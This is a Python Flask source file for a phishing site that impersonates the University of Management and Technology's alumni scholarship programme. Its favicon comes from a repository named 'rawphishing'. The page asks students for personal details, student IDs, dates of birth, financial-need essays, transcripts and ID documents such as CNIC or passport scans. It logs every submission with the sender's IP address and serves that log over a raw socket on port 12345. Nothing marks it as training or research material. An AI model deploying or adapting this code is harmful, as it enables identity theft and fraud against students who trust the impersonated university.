from flask import Flask, request, render_template_string, redirect, session
import socket
import threading
import datetime
import os
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.secret_key = 'your_secret_key_here'

# Configuration
LOG_FILE = "umt_scholarship_log.txt"
UPLOAD_FOLDER = 'uploads'
ALLOWED_EXTENSIONS = {'pdf'}

# Ensure upload directory exists
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# External assets
UMT_LOGO_URL = "https://via.placeholder.com/120x60?text=UMT+Logo"
FAVICON_URL = "https://github.com/Hck3eer/rawphishing/blob/d44aaa8507976b9fcad2530911c852ad645bd5fb/umt.png"

def log_data(data):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a", encoding='utf-8') as f:
        f.write(f"[{timestamp}] {data}\n")

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def save_uploaded_file(file, prefix):
    if file and allowed_file(file.filename):
        filename = secure_filename(f"{prefix}_{file.filename}")
        filepath = os.path.join(UPLOAD_FOLDER, filename)
        file.save(filepath)
        return filepath
    return None

@app.route('/')
def home():
    return render_template_string(SCHOLARSHIP_FORM)

@app.route('/submit', methods=['POST'])
def submit():
    # Collect all form data
    form_data = {
        'personal_info': {
            'firstName': request.form.get('firstName'),
            'lastName': request.form.get('lastName'),
            'studentId': request.form.get('studentId'),
            'email': request.form.get('email'),
            'phone': request.form.get('phone'),
            'dob': request.form.get('dob'),
            'gender': request.form.get('gender')
        },
        'academic_info': {
            'program': request.form.get('program'),
            'gpa': request.form.get('gpa'),
            'semester': request.form.get('semester'),
            'international': request.form.get('international')
        },
        'essays': {
            'financialNeed': request.form.get('financialNeed'),
            'achievements': request.form.get('achievements'),
            'extracurricular': request.form.get('extracurricular'),
            'goals': request.form.get('goals')
        },
        'files': {
            'transcript': request.files.get('transcript'),
            'idProof': request.files.get('idProof'),
            'recommendation': request.files.get('recommendation'),
            'otherDocs': request.files.getlist('otherDocs')
        },
        'agreements': {
            'agreeTerms': request.form.get('agreeTerms'),
            'allowContact': request.form.get('allowContact')
        },
        'ip_address': request.remote_addr,
        'timestamp': datetime.datetime.now().isoformat()
    }

    # Save uploaded files
    file_paths = {}
    if form_data['files']['transcript']:
        file_paths['transcript'] = save_uploaded_file(form_data['files']['transcript'], form_data['personal_info']['studentId'])
    
    if form_data['files']['idProof']:
        file_paths['idProof'] = save_uploaded_file(form_data['files']['idProof'], form_data['personal_info']['studentId'])
    
    if form_data['files']['recommendation']:
        file_paths['recommendation'] = save_uploaded_file(form_data['files']['recommendation'], form_data['personal_info']['studentId'])
    
    for doc in form_data['files']['otherDocs']:
        if doc:
            save_uploaded_file(doc, f"{form_data['personal_info']['studentId']}_other")

    # Log all data
    log_entry = {
        'form_data': form_data,
        'file_paths': file_paths
    }
    log_data(str(log_entry))

    # Store in session for success page
    session['submission_data'] = {
        'name': f"{form_data['personal_info']['firstName']} {form_data['personal_info']['lastName']}",
        'studentId': form_data['personal_info']['studentId']
    }

    return redirect('/success')

@app.route('/success')
def success():
    submission_data = session.get('submission_data', {})
    return render_template_string(SUCCESS_PAGE, **submission_data)

def log_viewer_server():
    host = '0.0.0.0'
    port = 12345
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        s.listen()
        print(f"[*] Log viewer running at {host}:{port}")
        while True:
            conn, addr = s.accept()
            with conn:
                with open(LOG_FILE, "r", encoding='utf-8') as f:
                    logs = f.read()
                conn.sendall(logs.encode())

# HTML Templates
SCHOLARSHIP_FORM = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UMT Alumni Summer Scholarships Programme</title>
    <link rel="icon" type="image/x-icon" href="{FAVICON_URL}">
    <style>
        :root {{
            --primary-color: #0056b3;
            --secondary-color: #f8f9fa;
            --accent-color: #ffc107;
            --text-color: #333;
            --light-text: #6c757d;
            --error-color: #dc3545;
            --success-color: #28a745;
        }}
        
        * {{
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }}
        
        body {{
            background-color: #f5f5f5;
            color: var(--text-color);
            line-height: 1.6;
        }}
        
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }}
        
        header {{
            background-color: var(--primary-color);
            color: white;
            padding: 20px 0;
            text-align: center;
            margin-bottom: 30px;
            border-bottom: 5px solid var(--accent-color);
        }}
        
        .logo {{
            width: 120px;
            height: auto;
            margin-bottom: 15px;
        }}
        
        h1 {{
            font-size: 2.2rem;
            margin-bottom: 10px;
        }}
        
        h2 {{
            font-size: 1.5rem;
            color: var(--primary-color);
            margin-bottom: 20px;
            border-bottom: 2px solid var(--accent-color);
            padding-bottom: 8px;
        }}
        
        .scholarship-info {{
            background-color: white;
            padding: 25px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            margin-bottom: 30px;
        }}
        
        .application-form {{
            background-color: white;
            padding: 25px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        }}
        
        .form-group {{
            margin-bottom: 20px;
        }}
        
        label {{
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
        }}
        
        .required:after {{
            content: " *";
            color: var(--error-color);
        }}
        
        input[type="text"],
        input[type="email"],
        input[type="tel"],
        input[type="date"],
        input[type="number"],
        select,
        textarea {{
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
            transition: border 0.3s;
        }}
        
        input:focus,
        select:focus,
        textarea:focus {{
            border-color: var(--primary-color);
            outline: none;
            box-shadow: 0 0 0 2px rgba(0, 86, 179, 0.2);
        }}
        
        .radio-group, .checkbox-group {{
            margin-top: 8px;
        }}
        
        .radio-option, .checkbox-option {{
            margin-bottom: 10px;
            display: flex;
            align-items: center;
        }}
        
        .radio-option input, .checkbox-option input {{
            margin-right: 10px;
        }}
        
        .file-upload {{
            position: relative;
            overflow: hidden;
            display: inline-block;
            width: 100%;
        }}
        
        .file-upload-btn {{
            border: 2px dashed #ccc;
            border-radius: 4px;
            padding: 20px;
            text-align: center;
            cursor: pointer;
            width: 100%;
            background-color: var(--secondary-color);
            transition: all 0.3s;
        }}
        
        .file-upload-btn:hover {{
            border-color: var(--primary-color);
            background-color: rgba(0, 86, 179, 0.05);
        }}
        
        .file-upload input[type="file"] {{
            position: absolute;
            left: 0;
            top: 0;
            opacity: 0;
            width: 100%;
            height: 100%;
            cursor: pointer;
        }}
        
        .file-name {{
            margin-top: 10px;
            font-size: 14px;
            color: var(--light-text);
        }}
        
        .form-row {{
            display: flex;
            gap: 20px;
        }}
        
        .form-col {{
            flex: 1;
        }}
        
        .btn {{
            background-color: var(--primary-color);
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 16px;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.3s;
        }}
        
        .btn:hover {{
            background-color: #003d7a;
        }}
        
        .btn-block {{
            display: block;
            width: 100%;
        }}
        
        .error-message {{
            color: var(--error-color);
            font-size: 14px;
            margin-top: 5px;
            display: none;
        }}
        
        .success-message {{
            display: none;
            background-color: var(--success-color);
            color: white;
            padding: 20px;
            border-radius: 4px;
            margin-top: 20px;
            text-align: center;
        }}
        
        .terms {{
            font-size: 14px;
            color: var(--light-text);
            margin-top: 30px;
        }}
        
        footer {{
            text-align: center;
            margin-top: 50px;
            padding: 20px;
            color: var(--light-text);
            font-size: 14px;
        }}
        
        @media (max-width: 768px) {{
            .form-row {{
                flex-direction: column;
                gap: 0;
            }}
            
            h1 {{
                font-size: 1.8rem;
            }}
        }}
    </style>
</head>
<body>
    <header>
        <div class="container">
            <img src="{UMT_LOGO_URL}" alt="UMT Logo" class="logo">
            <h1>University of Management and Technology</h1>
            <p>Alumni Summer Scholarships Programme</p>
        </div>
    </header>
    
    <div class="container">
        <section class="scholarship-info">
            <h2>About the Scholarship</h2>
            <p>The UMT Alumni Summer Scholarships Programme is designed to support outstanding students who demonstrate academic excellence, leadership potential, and financial need. This prestigious scholarship covers tuition fees for summer courses and provides additional support for academic materials.</p>
            
            <h3>Eligibility Criteria</h3>
            <ul>
                <li>Currently enrolled as a full-time student at UMT</li>
                <li>Minimum GPA of 3.5 or equivalent</li>
                <li>Demonstrated financial need</li>
                <li>Active participation in extracurricular activities</li>
                <li>Completed at least two semesters at UMT</li>
            </ul>
            
            <h3>Application Deadline</h3>
            <p>All applications must be submitted by May 15, 2024. Late submissions will not be considered.</p>
        </section>
        
        <section class="application-form">
            <h2>Application Form</h2>
            <p>Please fill out all required fields and upload the necessary documents. Fields marked with <span style="color: var(--error-color);">*</span> are required.</p>
            
            <form id="scholarshipForm" method="POST" action="/submit" enctype="multipart/form-data">
                <div class="form-row">
                    <div class="form-col">
                        <div class="form-group">
                            <label for="firstName" class="required">First Name</label>
                            <input type="text" id="firstName" name="firstName" required>
                        </div>
                    </div>
                    <div class="form-col">
                        <div class="form-group">
                            <label for="lastName" class="required">Last Name</label>
                            <input type="text" id="lastName" name="lastName" required>
                        </div>
                    </div>
                </div>
                
                <div class="form-group">
                    <label for="studentId" class="required">UMT Student ID</label>
                    <input type="text" id="studentId" name="studentId" required pattern="[A-Za-z0-9]{{8}}">
                </div>
                
                <div class="form-row">
                    <div class="form-col">
                        <div class="form-group">
                            <label for="email" class="required">Email Address</label>
                            <input type="email" id="email" name="email" required>
                        </div>
                    </div>
                    <div class="form-col">
                        <div class="form-group">
                            <label for="phone" class="required">Phone Number</label>
                            <input type="tel" id="phone" name="phone" required>
                        </div>
                    </div>
                </div>
                
                <div class="form-row">
                    <div class="form-col">
                        <div class="form-group">
                            <label for="dob" class="required">Date of Birth</label>
                            <input type="date" id="dob" name="dob" required>
                        </div>
                    </div>
                    <div class="form-col">
                        <div class="form-group">
                            <label for="gender" class="required">Gender</label>
                            <select id="gender" name="gender" required>
                                <option value="">Select Gender</option>
                                <option value="male">Male</option>
                                <option value="female">Female</option>
                                <option value="other">Other</option>
                                <option value="prefer-not-to-say">Prefer not to say</option>
                            </select>
                        </div>
                    </div>
                </div>
                
                <div class="form-group">
                    <label for="program" class="required">Current Program of Study</label>
                    <input type="text" id="program" name="program" required>
                </div>
                
                <div class="form-row">
                    <div class="form-col">
                        <div class="form-group">
                            <label for="gpa" class="required">Current GPA</label>
                            <input type="number" id="gpa" name="gpa" step="0.01" min="0" max="4.0" required>
                        </div>
                    </div>
                    <div class="form-col">
                        <div class="form-group">
                            <label for="semester" class="required">Current Semester</label>
                            <input type="number" id="semester" name="semester" min="1" max="12" required>
                        </div>
                    </div>
                </div>
                
                <div class="form-group">
                    <label class="required">Are you an international student?</label>
                    <div class="radio-group">
                        <div class="radio-option">
                            <input type="radio" id="international-yes" name="international" value="yes" required>
                            <label for="international-yes">Yes</label>
                        </div>
                        <div class="radio-option">
                            <input type="radio" id="international-no" name="international" value="no">
                            <label for="international-no">No</label>
                        </div>
                    </div>
                </div>
                
                <div class="form-group">
                    <label for="financialNeed" class="required">Describe your financial need</label>
                    <textarea id="financialNeed" name="financialNeed" rows="4" required></textarea>
                </div>
                
                <div class="form-group">
                    <label for="achievements">Academic Achievements and Awards (if any)</label>
                    <textarea id="achievements" name="achievements" rows="4"></textarea>
                </div>
                
                <div class="form-group">
                    <label for="extracurricular">Extracurricular Activities and Leadership Roles</label>
                    <textarea id="extracurricular" name="extracurricular" rows="4"></textarea>
                </div>
                
                <div class="form-group">
                    <label for="goals" class="required">Your Academic and Career Goals</label>
                    <textarea id="goals" name="goals" rows="4" required></textarea>
                </div>
                
                <h3>Required Documents</h3>
                <p>Please upload the following documents in PDF format:</p>
                
                <div class="form-group">
                    <label for="transcript" class="required">Official Transcript</label>
                    <div class="file-upload">
                        <label class="file-upload-btn">
                            Click to upload file
                            <input type="file" id="transcript" name="transcript" accept=".pdf" required>
                        </label>
                        <div class="file-name" id="transcriptFileName">No file chosen</div>
                    </div>
                </div>
                
                <div class="form-group">
                    <label for="idProof" class="required">ID Proof (CNIC/Passport)</label>
                    <div class="file-upload">
                        <label class="file-upload-btn">
                            Click to upload file
                            <input type="file" id="idProof" name="idProof" accept=".pdf" required>
                        </label>
                        <div class="file-name" id="idProofFileName">No file chosen</div>
                    </div>
                </div>
                
                <div class="form-group">
                    <label for="recommendation">Recommendation Letter (Optional)</label>
                    <div class="file-upload">
                        <label class="file-upload-btn">
                            Click to upload file
                            <input type="file" id="recommendation" name="recommendation" accept=".pdf">
                        </label>
                        <div class="file-name" id="recommendationFileName">No file chosen</div>
                    </div>
                </div>
                
                <div class="form-group">
                    <label for="otherDocs">Other Supporting Documents (Optional)</label>
                    <div class="file-upload">
                        <label class="file-upload-btn">
                            Click to upload file
                            <input type="file" id="otherDocs" name="otherDocs" accept=".pdf" multiple>
                        </label>
                        <div class="file-name" id="otherDocsFileName">No files chosen</div>
                    </div>
                </div>
                
                <div class="form-group">
                    <div class="checkbox-option">
                        <input type="checkbox" id="agreeTerms" name="agreeTerms" required>
                        <label for="agreeTerms" class="required">I certify that all information provided is accurate and complete to the best of my knowledge.</label>
                    </div>
                </div>
                
                <div class="form-group">
                    <div class="checkbox-option">
                        <input type="checkbox" id="allowContact" name="allowContact">
                        <label for="allowContact">I agree to be contacted by the scholarship committee for additional information if needed.</label>
                    </div>
                </div>
                
                <button type="submit" class="btn btn-block">Submit Application</button>
            </form>
            
            <div class="terms">
                <p><strong>Note:</strong> All applications will be reviewed by the scholarship committee. Selected candidates may be called for an interview. The decision of the committee will be final.</p>
                <p>For any queries, please contact: scholarships@umt.edu.pk</p>
            </div>
        </section>
    </div>
    
    <footer>
        <div class="container">
            <p>&copy; 2024 University of Management and Technology. All rights reserved.</p>
        </div>
    </footer>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {{
            // File upload display
            document.getElementById('transcript').addEventListener('change', function(e) {{
                const fileName = e.target.files.length ? e.target.files[0].name : 'No file chosen';
                document.getElementById('transcriptFileName').textContent = fileName;
            }});
            
            document.getElementById('idProof').addEventListener('change', function(e) {{
                const fileName = e.target.files.length ? e.target.files[0].name : 'No file chosen';
                document.getElementById('idProofFileName').textContent = fileName;
            }});
            
            document.getElementById('recommendation').addEventListener('change', function(e) {{
                const fileName = e.target.files.length ? e.target.files[0].name : 'No file chosen';
                document.getElementById('recommendationFileName').textContent = fileName;
            }});
            
            document.getElementById('otherDocs').addEventListener('change', function(e) {{
                const fileCount = e.target.files.length;
                const fileName = fileCount ? 
                    (fileCount === 1 ? e.target.files[0].name : `${{fileCount}} files chosen`) : 
                    'No files chosen';
                document.getElementById('otherDocsFileName').textContent = fileName;
            }});
        }});
    </script>
</body>
</html>
"""

SUCCESS_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Application Submitted - UMT Alumni Summer Scholarships Programme</title>
    <link rel="icon" type="image/x-icon" href="{FAVICON_URL}">
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f5f5f5;
            color: #333;
            line-height: 1.6;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
        }
        
        .success-container {
            background-color: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            max-width: 600px;
            text-align: center;
        }
        
        h1 {
            color: #28a745;
            margin-bottom: 20px;
        }
        
        .success-icon {
            font-size: 60px;
            color: #28a745;
            margin-bottom: 20px;
        }
        
        .btn {
            background-color: #0056b3;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 16px;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.3s;
            margin-top: 20px;
            text-decoration: none;
            display: inline-block;
        }
        
        .btn:hover {
            background-color: #003d7a;
        }
    </style>
</head>
<body>
    <div class="success-container">
        <div class="success-icon">✓</div>
        <h1>Application Submitted Successfully!</h1>
        <p>Thank you, {{ name }} (ID: {{ studentId }}), for applying to the UMT Alumni Summer Scholarships Programme.</p>
        <p>We have received your application and will review it carefully. You will receive a confirmation email shortly.</p>
        <a href="/" class="btn">Return to Home</a>
    </div>
</body>
</html>
"""

if __name__ == "__main__":
    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)
    
    flask_thread = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000))
    flask_thread.daemon = True
    flask_thread.start()
    
    log_viewer_server()
